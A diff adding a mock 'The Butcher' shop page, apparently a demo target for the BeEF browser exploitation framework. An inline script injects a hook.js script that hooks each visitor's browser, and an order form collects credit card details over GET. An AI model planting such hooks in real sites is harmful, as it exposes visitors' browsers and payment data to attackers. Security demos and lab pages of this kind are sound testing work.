@@ -1,0 +1,59 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+   "http://www.w3.org/TR/html4/loose.dtd">
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<title>The Butcher</title>
+	
+	<link rel="stylesheet" type="text/css" href="butch.css" />
+</head>
+<body>
+<script src="jquery-1.5.min.js"></script>
+<script>
+
+	function showfriends() {
+		$("#hamper").hide();
+		$("#friends").show();
+	}
+	
+	function showHamper() {
+		$("#friends").hide();
+		$("#hamper").show();
+	}
+
+</script>
+<script>
+	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
+<div id="content">
+	<!-- Awesome Beef Images from: http://www.flickr.com/photos/bulle_de/4657658048/ and http://www.flickr.com/photos/dinesarasota/3944042189/ -->
+	<div id="logo">
+		<img src="top.jpg" alt="The Butcher" />
+	</div>
+	<div id="stuff">
+		<div class="bigger">
+Welcome to The Butcher, your source of delicious meats. Please feel free to view our samples, sign up to our mailing-list or purchase our special BeEF-hamper!
+		</div>
+		<div class="normal">
+			<button type="button" onclick="showfriends();">Our Meaty Friends</button> &nbsp; <button type="button" onclick="showHamper();">Order Your BeEF-Hamper</button>
+			<div id="friends">
+				<a href="http://www.bindshell.net">Bindshell</a><br />
+				<a href="http://www.slashdot.org">Slashdot</a><br />
+				<a href="http://ha.ckers.org/">ha.ckers.org homepage</a><br />
+			</div>
+			<div id="hamper">
+				Delicious delicious hamper, straight to your door!<br />
+				<form method="GET" action="index.html">Name: <input type="text" name="yourname" /><br />
+					Phone: <input type="text" name="phone" /><br />
+					Address: <input type="text" name="address" /><br />
+					Credit Card: <input type="text" name="creditcard" /><br />
+					<input type="submit" value="Buy buy!" />
+				</form>
+			</div>
+		</div>
+	</div>
+</div>
+</body>
+</html>
